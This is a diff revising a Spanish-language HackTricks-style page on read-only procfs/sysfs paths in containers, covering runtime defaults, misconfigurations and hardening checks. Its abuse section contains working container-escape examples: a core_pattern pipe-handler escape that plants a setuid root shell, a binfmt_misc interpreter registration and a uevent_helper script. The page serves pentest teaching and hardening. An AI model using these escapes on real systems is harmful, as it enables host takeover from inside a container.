@@ -2,28 +2,26 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Las rutas del sistema en modo solo lectura son una protección distinta de las rutas enmascaradas. En lugar de ocultar completamente una ruta, el runtime la expone pero la monta en solo lectura. Esto es común en ubicaciones seleccionadas de procfs y sysfs donde el acceso de lectura puede ser aceptable o necesario por motivos operativos, pero las escrituras serían demasiado peligrosas.
-
-El propósito es sencillo: muchas interfaces del kernel se vuelven mucho más peligrosas cuando son escribibles. Un montaje en solo lectura no elimina todo el valor para el reconocimiento, pero evita que una workload comprometida modifique los archivos del kernel subyacentes a través de esa ruta.
+Las rutas del sistema en solo lectura son una protección independiente de las rutas enmascaradas. En lugar de ocultar una ruta por completo, el runtime la expone pero la monta como solo lectura. Esto es común en ubicaciones seleccionadas de procfs y sysfs donde el acceso de lectura puede ser aceptable o necesario operativamente, pero las escrituras serían demasiado peligrosas.
 
 ## Operación
 
-Los runtimes suelen marcar partes de la vista proc/sys como solo lectura. Dependiendo del runtime y del host, esto puede incluir rutas como:
+Los runtimes frecuentemente marcan partes de la vista proc/sys como solo lectura. Dependiendo del runtime y del host, esto puede incluir rutas como:
 
 - `/proc/sys`
 - `/proc/sysrq-trigger`
 - `/proc/irq`
 - `/proc/bus`
 
-La lista real varía, pero el modelo es el mismo: permitir visibilidad donde se necesite, impedir modificaciones por defecto.
+La lista real varía, pero el modelo es el mismo: permitir la visibilidad donde sea necesaria, negar la modificación por defecto.
 
 ## Laboratorio
 
-Inspecciona la lista de rutas de solo lectura declaradas por Docker:
+Inspeccione la lista de rutas de solo lectura declarada por Docker:
 ```bash
 docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
 ```
-Inspeccione la vista montada de proc/sys desde dentro del contenedor:
+Inspeccione la vista montada proc/sys desde dentro del contenedor:
 ```bash
 mount | grep -E '/proc|/sys'
 find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
@@ -31,20 +29,20 @@ find /sys -maxdepth 3 -writable 2>/dev/null | head
 ```
 ## Impacto en la seguridad
 
-Las rutas del sistema en modo de solo lectura reducen una amplia clase de abusos con impacto en el host. Incluso cuando un atacante puede inspeccionar procfs o sysfs, no poder escribir allí elimina muchas vías de modificación directa que implican parámetros del kernel, manejadores de fallos, ayudantes de carga de módulos u otras interfaces de control. La exposición no desaparece, pero la transición de divulgación de información a influencia sobre el host se vuelve más difícil.
+Las rutas del sistema montadas en modo solo lectura reducen una amplia clase de abusos con impacto en el host. Incluso cuando un atacante puede inspeccionar procfs o sysfs, la imposibilidad de escribir allí elimina muchas vías de modificación directa que implican parámetros del kernel, manejadores de fallos, ayudantes de carga de módulos u otras interfaces de control. La exposición no desaparece, pero la transición de divulgación de información a influencia sobre el host se vuelve más difícil.
 
-## Errores de configuración
+## Misconfiguraciones
 
-Los errores principales son desmascarar o volver a montar rutas sensibles en modo lectura-escritura, exponer el contenido de host proc/sys directamente con bind mounts escribibles, o usar modos privilegiados que efectivamente evitan los valores predeterminados del runtime más seguros. En Kubernetes, `procMount: Unmasked` y las cargas de trabajo privilegiadas a menudo van de la mano con una protección de proc más débil. Otro error operativo común es asumir que, dado que el runtime normalmente monta estas rutas como solo lectura, todas las cargas de trabajo siguen heredando ese valor por defecto.
+Los errores principales consisten en desenmascarar o remontar rutas sensibles como lectura-escritura, exponer el contenido de proc/sys del host directamente con bind mounts escribibles, o usar modos privilegiados que efectivamente eluden los valores por defecto más seguros del runtime. En Kubernetes, `procMount: Unmasked` y las cargas de trabajo privilegiadas a menudo van de la mano con una protección de proc más débil. Otro error operativo común es asumir que, dado que el runtime normalmente monta estas rutas como solo lectura, todas las cargas de trabajo siguen heredando ese comportamiento por defecto.
 
 ## Abuso
 
-Si la protección es débil, empieza buscando entradas de proc/sys que sean escribibles:
+Si la protección es débil, empiece buscando entradas de proc/sys escribibles:
 ```bash
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
 ```
-Cuando existen entradas escribibles, las rutas de seguimiento de mayor valor incluyen:
+Cuando existan entradas con permiso de escritura, las rutas de seguimiento de alto valor incluyen:
 ```bash
 cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
 cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
@@ -54,18 +52,18 @@ cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kerne
 ```
 Qué pueden revelar estos comandos:
 
-- Las entradas escribibles bajo `/proc/sys` a menudo significan que el container puede modificar el comportamiento del kernel del host en lugar de solo inspeccionarlo.
-- `core_pattern` es especialmente importante porque un valor orientado al host escribible puede convertirse en una ruta de ejecución de código en el host al provocar el crash de un proceso después de establecer un manejador de pipe.
-- `modprobe` revela el helper usado por el kernel para flujos relacionados con la carga de módulos; es un objetivo clásico de alto valor cuando es escribible.
-- `binfmt_misc` te indica si es posible el registro de intérpretes personalizados. Si el registro es escribible, esto puede convertirse en una primitiva de ejecución en lugar de solo un leak de información.
-- `panic_on_oom` controla una decisión del kernel a nivel de host y por tanto puede convertir el agotamiento de recursos en un denial of service contra el host.
-- `uevent_helper` es uno de los ejemplos más claros de una ruta helper sysfs escribible que produce ejecución en contexto del host.
+- Entradas escribibles bajo `/proc/sys` a menudo significan que el contenedor puede modificar el comportamiento del kernel del host en lugar de únicamente inspeccionarlo.
+- `core_pattern` es especialmente importante porque un valor orientado al host que sea escribible puede convertirse en una ruta de ejecución de código en el host al provocar un crash de un proceso después de establecer un pipe handler.
+- `modprobe` revela el helper usado por el kernel para los flujos relacionados con la carga de módulos; es un objetivo clásico de alto valor cuando es escribible.
+- `binfmt_misc` te indica si el registro de intérpretes personalizados es posible. Si el registro es escribible, esto puede convertirse en una primitiva de ejecución en lugar de solo un information leak.
+- `panic_on_oom` controla una decisión del kernel a nivel de host y por tanto puede convertir el agotamiento de recursos en un host denial of service.
+- `uevent_helper` es uno de los ejemplos más claros de una ruta helper en sysfs escribible que produce ejecución en contexto del host.
 
-Hallazgos interesantes incluyen controles proc orientados al host escribibles o entradas sysfs que normalmente deberían haber sido de solo lectura. En ese punto, la carga de trabajo se ha desplazado desde una vista de container restringida hacia una influencia significativa sobre el kernel.
+Hallazgos interesantes incluyen parámetros proc orientados al host escribibles o entradas sysfs que normalmente deberían haber sido de solo lectura. En ese punto, la carga de trabajo ha pasado de una visión limitada del contenedor hacia una influencia significativa sobre el kernel.
 
-### Ejemplo completo: `core_pattern` Escape del host
+### Ejemplo completo: `core_pattern` Host Escape
 
-Si `/proc/sys/kernel/core_pattern` es escribible desde dentro del container y apunta a la vista del kernel del host, puede abusarse de ello para ejecutar un payload tras un crash:
+Si `/proc/sys/kernel/core_pattern` es escribible desde dentro del contenedor y apunta a la vista del kernel del host, puede abusarse de él para ejecutar un payload después de un crash:
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] || exit 1
 overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -87,11 +85,11 @@ gcc /tmp/crash.c -o /tmp/crash
 /tmp/crash
 ls -l /tmp/rootsh
 ```
-Si la ruta realmente alcanza el kernel del host, el payload se ejecuta en el host y deja atrás una shell setuid.
+Si la ruta realmente alcanza el kernel del host, el payload se ejecuta en el host y deja una shell setuid detrás.
 
-### Ejemplo completo: Registro de `binfmt_misc`
+### Ejemplo completo: registro de `binfmt_misc`
 
-Si `/proc/sys/fs/binfmt_misc/register` es escribible, el registro de un intérprete personalizado puede producir ejecución de código cuando se ejecuta el archivo coincidente:
+Si `/proc/sys/fs/binfmt_misc/register` es escribible, el registro de un intérprete personalizado puede producir ejecución de código cuando se ejecuta el archivo correspondiente:
 ```bash
 mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
 cat <<'EOF' > /tmp/h
@@ -105,11 +103,11 @@ chmod +x /tmp/test.ht
 /tmp/test.ht
 cat /tmp/binfmt.out
 ```
-En un `binfmt_misc` escribible orientado al host, el resultado es la ejecución de código en la ruta del intérprete activada por el kernel.
+En un `binfmt_misc` orientado al host y escribible, el resultado es ejecución de código en la ruta del intérprete activada por el kernel.
 
 ### Ejemplo completo: `uevent_helper`
 
-Si `/sys/kernel/uevent_helper` es escribible, el kernel puede invocar un host-path helper cuando se desencadena un evento coincidente:
+Si `/sys/kernel/uevent_helper` es escribible, el kernel puede invocar un host-path helper cuando se desencadene un evento coincidente:
 ```bash
 cat <<'EOF' > /tmp/evil-helper
 #!/bin/sh
@@ -123,9 +121,9 @@ cat /tmp/uevent.out
 ```
 La razón por la que esto es tan peligroso es que la ruta del helper se resuelve desde la perspectiva del sistema de archivos del host en lugar de desde un contexto seguro exclusivo del contenedor.
 
-## Checks
+## Comprobaciones
 
-Estas comprobaciones determinan si la exposición de procfs/sysfs es de solo lectura donde se espera y si la carga de trabajo aún puede modificar interfaces sensibles del kernel.
+Estas comprobaciones determinan si la exposición de procfs/sysfs es de solo lectura donde se espera y si la carga de trabajo aún puede modificar interfaces del kernel sensibles.
 ```bash
 docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
 mount | grep -E '/proc|/sys'                                      # Actual mount options
@@ -134,18 +132,18 @@ find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sys
 ```
 Lo interesante aquí:
 
-- Una carga de trabajo normal endurecida debería exponer muy pocas entradas escribibles en `/proc/sys`.
-- Las rutas escribibles en `/proc/sys` suelen ser más críticas que el acceso de solo lectura ordinario.
-- Si el runtime indica que una ruta es de solo lectura pero en la práctica es escribible, revisa detenidamente la propagación de montajes, los bind mounts y los ajustes de privilegios.
+- Una hardened workload normal debería exponer muy pocas entradas escribibles en proc/sys.
+- Las rutas `/proc/sys` escribibles a menudo son más importantes que el acceso de solo lectura ordinario.
+- Si el runtime indica que una ruta es read-only pero en la práctica es escribible, revise cuidadosamente mount propagation, bind mounts y los privilege settings.
 
-## Runtime Defaults
+## Valores predeterminados del runtime
 
-| Runtime / platform | Default state | Default behavior | Common manual weakening |
+| Runtime / plataforma | Estado por defecto | Comportamiento por defecto | Debilitamiento manual común |
 | --- | --- | --- | --- |
-| Docker Engine | Enabled by default | Docker define una lista predeterminada de rutas de solo lectura para entradas sensibles de proc | exponer montajes host de proc/sys, `--privileged` |
-| Podman | Enabled by default | Podman aplica rutas predeterminadas de solo lectura a menos que se relajen explícitamente | `--security-opt unmask=ALL`, montajes amplios del host, `--privileged` |
-| Kubernetes | Inherits runtime defaults | Usa el modelo de rutas de solo lectura del runtime subyacente a menos que se debilite por configuraciones del Pod o montajes del host | `procMount: Unmasked`, cargas de trabajo privilegiadas, montajes del host de `/proc/sys` escribibles |
-| containerd / CRI-O under Kubernetes | Runtime default | Usualmente se basa en los valores predeterminados de OCI/runtime | igual que la fila de Kubernetes; cambios directos en la configuración del runtime pueden debilitar el comportamiento |
+| Docker Engine | Habilitado por defecto | Docker define una lista por defecto de rutas de solo lectura para entradas sensibles de proc | exponer montajes host proc/sys, `--privileged` |
+| Podman | Habilitado por defecto | Podman aplica rutas por defecto de solo lectura a menos que se relajen explícitamente | `--security-opt unmask=ALL`, amplios montajes de host, `--privileged` |
+| Kubernetes | Hereda los valores predeterminados del runtime | Usa el modelo de rutas de solo lectura del runtime subyacente a menos que se debilite por la configuración del Pod o montajes del host | `procMount: Unmasked`, privileged workloads, montajes host proc/sys escribibles |
+| containerd / CRI-O under Kubernetes | Predeterminado del runtime | Normalmente se basa en los valores predeterminados de OCI/runtime | igual que la fila de Kubernetes; cambios directos en la configuración del runtime pueden debilitar el comportamiento |
 
-El punto clave es que las rutas del sistema en solo lectura suelen estar presentes como valor predeterminado del runtime, pero son fáciles de socavar con modos privilegiados o bind mounts del host.
+El punto clave es que las rutas del sistema de solo lectura suelen estar presentes como valor predeterminado del runtime, pero son fáciles de socavar con modos privileged o host bind mounts.
 {{#include ../../../../banners/hacktricks-training.md}}
